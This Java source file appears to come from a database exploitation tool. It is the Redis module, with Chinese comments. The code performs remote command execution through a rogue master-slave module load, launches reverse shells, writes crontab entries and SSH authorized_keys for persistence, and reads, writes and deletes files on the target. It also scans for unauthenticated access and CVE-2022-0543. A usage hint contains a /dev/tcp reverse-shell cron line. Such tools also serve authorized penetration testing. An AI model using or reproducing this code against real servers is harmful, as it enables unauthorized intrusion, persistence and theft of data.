package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.RedisDao;
import org.json.JSONObject;
import redis.clients.jedis.Jedis;

import java.util.Map;

/**
 * Redis 分发：info / exec（system.exec；模块部署走 --vps-* 外部 rogue 范式）/ clean / revshell
 * + crontab / sshkey / rdb（变异操作，持写锁）；文件五件套与 CVE 扫描 M3a。
 */
public class RedisDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "redis";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc.isEmpty() ? "UTF-8" : ctx.enc;
        RedisDao dao = new RedisDao(rec.get("ipaddress"), rec.get("port"), rec.get("password"),
                String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);

        if ("sql".equals(tool)) {
            return Result.usage("redis 无 SQL 面", "命令执行用 exec（需模块）；键操作后续经 doctor 建议的通道").withId(id);
        }
        if ("info".equals(tool)) {
            dao.getConnection();
            dao.getInfo();
            JSONObject d = new JSONObject();
            d.put("version", nz(dao.getRedisVersion()));
            d.put("os", nz(dao.getOs()));
            d.put("arch_bits", nz(dao.getArch()));
            d.put("cves", scanCves(dao, rec, ctx));
            return Result.ok("Redis " + nz(dao.getRedisVersion()) + " / " + nz(dao.getOs())
                    + " / " + nz(dao.getArch()) + "bit", d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            dao.getConnection();
            String vpsHost = flag(p, "vps-host", "");
            String vpsPort = flag(p, "vps-port", "");
            if (vpsHost.isEmpty() != vpsPort.isEmpty()) {
                return Result.usage("--vps-host 与 --vps-port 必须成对传入",
                        "exec --vps-host <rogue地址> --vps-port <rogue端口> 'id'").withId(id);
            }
            if (!vpsHost.isEmpty() && !vpsPort.isEmpty()) {
                // rogue 外部范式：伪主库由调用方先行启动（SKILL 纪律 6），CLI 只做主从对接与模块装载
                dao.rogue(vpsHost, vpsPort, Math.max(ctx.timeoutSec, 5) * 1000);
            }
            if (!moduleLoaded(dao)) {
                return Result.target("system 模块未加载，无法 system.exec",
                        "先部署模块: exec --vps-host <rogue地址> --vps-port <rogue端口>（需外部 rogue 进程 + 预编译 exp.so）；用后 clean").withId(id);
            }
            return Result.ok(nz(dao.eval(cmd, code))).withId(id);
        }
        if ("clean".equals(tool)) {
            dao.getConnection();
            if (dao.getDirConfig() == null) {
                dao.getInfo(); // clean 依赖 dir 原值
            }
            dao.clean();
            return Result.ok("clean 完成（dir/dbfilename/slave-read-only 还原，exp.so 删除，模块卸载）").withId(id);
        }
        if ("revshell".equals(tool)) {
            dao.getConnection();
            if (!moduleLoaded(dao)) {
                return Result.target("system 模块未加载，无法 system.rev",
                        "先 exec --vps-host .. --vps-port .. 部署模块（外部 rogue）；或用 crontab/sshkey 路线").withId(id);
            }
            dao.revShell(p.positionals.get(0), p.positionals.get(1));
            return Result.ok("revshell 已发起（回连 " + p.positionals.get(0) + ":" + p.positionals.get(1) + "）").withId(id);
        }
        if ("crontab".equals(tool)) {
            dao.getConnection();
            String line = p.positionals.isEmpty() ? "" : p.positionals.get(0);
            if (line.isEmpty()) {
                return Result.usage("crontab 需要 cron 行内容",
                        "例: mdut crontab --id 1 '*/1 * * * * /bin/sh -i >& /dev/tcp/IP/PORT 0>&1'").withId(id);
            }
            dao.crontab(line);
            return Result.ok("crontab 写入流程完成（成功与否见 stderr 明细）").withId(id);
        }
        if ("sshkey".equals(tool)) {
            dao.getConnection();
            String path = flag(p, "path", "/root/.ssh/");
            dao.sshkey(flag(p, "pubkey", ""), path);
            return Result.ok("sshkey 写入流程完成（目标 " + path + "authorized_keys，见 stderr 明细）").withId(id);
        }
        if ("rdb".equals(tool)) {
            dao.getConnection();
            dao.redisavedb(flag(p, "dir", ""), flag(p, "file", ""));
            return Result.ok("rdb 持久化已触发（dir=" + flag(p, "dir", "") + " file=" + flag(p, "file", "") + "）").withId(id);
        }
        // ---- 文件操作（M3a；全部经 system.exec，需模块已加载） ----
        if ("list-files".equals(tool) || "read".equals(tool) || "write".equals(tool)
                || "upload".equals(tool) || "download".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
            dao.getConnection();
            if (!moduleLoaded(dao)) {
                return Result.target("system 模块未加载，文件操作不可用",
                        "先 exec --vps-host .. --vps-port .. 部署模块（外部 rogue）；用后 clean").withId(id);
            }
            if ("list-files".equals(tool) || "rm".equals(tool) || "mkdir".equals(tool)) {
                String path = p.positionals.get(0);
                String cmd;
                if ("list-files".equals(tool)) {
                    cmd = "ls -la " + path;
                } else if ("rm".equals(tool)) {
                    cmd = "rm -rf " + path;
                } else {
                    cmd = "mkdir -p " + path;
                }
                String res = dao.evalStrict(cmd, code);   // 严格版：失败抛错由上层转 exit 3
                return Result.ok(res).withId(id);
            }
            if ("read".equals(tool) || "download".equals(tool)) {
                String path = p.positionals.get(0).replace("'", "'\\''");
                // base64 通道保二进制安全
                String b64 = nz(dao.eval("base64 " + path, "UTF-8")).replaceAll("\\s", "");
                if (b64.isEmpty()) {
                    return Result.target("读取失败: 目标回显为空", "检查路径/权限").withId(id);
                }
                byte[] bytes;
                try {
                    bytes = java.util.Base64.getDecoder().decode(b64);
                } catch (IllegalArgumentException e) {
                    return Result.target("读取失败: 目标无 base64 工具或回显异常", "尝试 exec 'cat <path>' 验证").withId(id);
                }
                if ("download".equals(tool)) {
                    return cli.dispatcher.MssqlDispatcher.toOutBytes(ctx, bytes, flag(p, "out", "")).withId(id);
                }
                return Result.ok(new String(bytes, code),
                        new JSONObject().put("b64", b64).put("size", bytes.length)).withId(id);
            }
            // write / upload：本地字节 → base64 管道写入
            byte[] content;
            String remote;
            if ("write".equals(tool)) {
                content = cli.dispatcher.MssqlDispatcher.readContent(p);
                remote = p.positionals.get(0);
            } else {
                byte[] bytes = Util.Utils.toByteArray(p.positionals.get(0));
                if (bytes == null) {
                    return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
                }
                content = bytes;
                remote = p.positionals.get(1);
            }
            if (content.length > 64 * 1024 * 1024) {
                return Result.usage("文件超过 64MB 上限（base64 管道内存约束）",
                        "大文件请走 download/upload 通道拆或经代理侧 scp").withId(id);
            }
            String b64 = java.util.Base64.getEncoder().encodeToString(content);
            String pathEsc = remote.replace("'", "'\\''");
            dao.evalStrict("echo " + b64 + " | base64 -d > " + pathEsc, "UTF-8");
            return Result.ok("写入完成: " + remote + " (" + content.length + " bytes，经 system.exec base64 管道)").withId(id);
        }
        return Result.usage("redis 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    private boolean moduleLoaded(RedisDao dao) {
        try {
            Jedis j = dao.jedis();
            return j != null && !j.moduleList().isEmpty();
        } catch (Throwable t) {
            // 老版本 redis 无 MODULE LIST 时保守放行，由 eval 自身报错
            return true;
        }
    }

    /**
     * CVE/风险扫描（Keep 项，Extend RedisScanner 行为面对齐；全部非破坏只读探测）：
     *  - 未授权访问：匿名连接可 PING
     *  - CVE-2022-0543（Debian 打包 Lua 沙箱逃逸）：EVAL "return type(os)" 可达即存在
     *  - 主从 RCE 窗口：4.x–5.0.5 版本段（模块加载路线）
     */
    private org.json.JSONArray scanCves(RedisDao dao, Map<String, String> rec, Ctx ctx) {
        org.json.JSONArray arr = new org.json.JSONArray();
        String ver = nz(dao.getRedisVersion());
        // 1) 未授权访问（匿名新连接）
        try {
            Jedis anon = new Jedis(rec.get("ipaddress"), Integer.parseInt(rec.get("port")),
                    Math.max(ctx.timeoutSec, 1) * 1000);
            try {
                String pong = anon.ping();
                if ("PONG".equalsIgnoreCase(pong)) {
                    arr.put(new JSONObject().put("id", "UNAUTH").put("level", "high")
                            .put("detail", "未授权访问（无密码可 PING）"));
                }
            } finally {
                anon.close();
            }
        } catch (Exception e) {
            // 需要认证 → 未授权不成立
        }
        // 2) CVE-2022-0543 Lua 沙箱逃逸
        try {
            Object r = dao.jedis().eval("return type(os)");
            if (r != null && String.valueOf(r).contains("table")) {
                arr.put(new JSONObject().put("id", "CVE-2022-0543").put("level", "critical")
                        .put("detail", "Lua 沙箱逃逸可用（os 可达）"));
            }
        } catch (Exception e) {
            // 沙箱正常 → 不存在
        }
        // 3) 主从 RCE 版本窗口
        if (ver.matches("4\\..*") || ver.matches("5\\.0\\.[0-5].*")) {
            arr.put(new JSONObject().put("id", "SLAVE-MODULE-RCE").put("level", "critical")
                    .put("detail", "版本 " + ver + " 处于 4.x–5.0.5 主从+模块加载窗口（exec --vps-* 路线可用）"));
        }
        return arr;
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
